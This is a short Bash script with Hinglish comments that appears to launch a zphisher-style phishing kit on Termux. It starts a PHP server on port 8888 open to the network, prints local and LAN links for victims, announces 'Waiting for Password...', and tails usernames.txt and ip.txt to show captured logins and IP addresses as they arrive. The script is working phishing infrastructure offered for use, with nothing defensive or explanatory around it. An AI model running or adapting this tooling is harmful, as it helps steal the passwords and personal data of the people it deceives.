#!/bin/bash

# --- 🛠️ 1. SETUP SAFE FOLDER (Termux Friendly) ---
# Hum Home folder me ek safe jagah banayenge
SAFE_DIR="$HOME/.zphisher_tmp"
mkdir -p "$SAFE_DIR"
chmod 777 "$SAFE_DIR"

# --- 🧹 2. KILL OLD PROCESSES ---
# Purana sab kuch band karo
pkill -f php > /dev/null 2>&1
rm -rf php_error.log

# --- 🎨 3. INTERFACE ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'

clear
echo -e "${GREEN}╔══════════════════════════════════════╗${RESET}"
echo -e "${GREEN}║     ${YELLOW}ULTIMATE FIX MODE (Port 8888)${GREEN}    ║${RESET}"
echo -e "${GREEN}╚══════════════════════════════════════╝${RESET}"
echo ""
echo -e "${CYAN}[*] Starting Server...${RESET}"

# --- 🚀 4. THE MAGIC COMMAND (Isme sab kuch direct set hai) ---
# Hum '-d' flag ka use karke PHP ko force kar rahe hain
# Ab 'Permission Denied' aa hi nahi sakta
php -S 0.0.0.0:8888 -t . \
    -d session.save_path="$SAFE_DIR" \
    -d upload_tmp_dir="$SAFE_DIR" \
    -d sys_temp_dir="$SAFE_DIR" \
    > php_error.log 2>&1 &

PID=$!
sleep 3

# --- 🔍 5. CHECK & DIAGNOSE ---
if ps -p $PID > /dev/null; then
   # SUCCESS: Server chal gaya
   echo -e "${GREEN}[✔] Server Started Successfully!${RESET}"
   echo -e "${YELLOW}----------------------------------------${RESET}"
   echo -e "${CYAN}Link 1: http://localhost:8888${RESET}"
   
   # IP Address nikalna
   MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
   if [ ! -z "$MYIP" ]; then
       echo -e "${CYAN}Link 2: http://$MYIP:8888${RESET}"
   fi
   echo -e "${YELLOW}----------------------------------------${RESET}"
   echo -e "${RED}[-] Press Ctrl + C to Exit${RESET}"
   echo ""
   echo -e "${GREEN}Waiting for Password...${RESET}"
   
   # Monitoring Loop
   tail -f usernames.txt ip.txt --pid=$PID 2>/dev/null | while read line; do
       echo -e "${GREEN}$line${RESET}"
   done

else
   # FAILURE: Agar ab bhi nahi chala, to asli wajah dikhao
   echo -e "${RED}[!] CRITICAL ERROR: Server Crash Ho Gaya!${RESET}"
   echo -e "${YELLOW}नीचे दिए गए Error को पढ़िये:${RESET}"
   echo -e "${RED}========================================${RESET}"
   cat php_error.log
   echo -e "${RED}========================================${RESET}"
   echo -e "${CYAN}Tip: Agar 'Syntax error' hai to apni index.php check karein.${RESET}"
fi
